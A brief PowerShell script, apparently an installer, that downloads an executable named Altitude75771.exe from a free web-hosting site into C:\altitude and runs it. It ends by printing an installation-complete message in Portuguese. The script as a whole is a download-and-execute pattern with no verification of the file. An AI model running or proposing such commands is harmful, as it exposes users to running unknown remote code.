mkdir C:\altitude
$url = "https://troantunes.000webhostapp.com/Altitude75771.exe"
Invoke-WebRequest -Uri $url -OutFile "C:\altitude\Altitude75771.exe"
cd C:\altitude
Start-Process Altitude75771.exe -Wait
Write-Host "Instalação Concluida"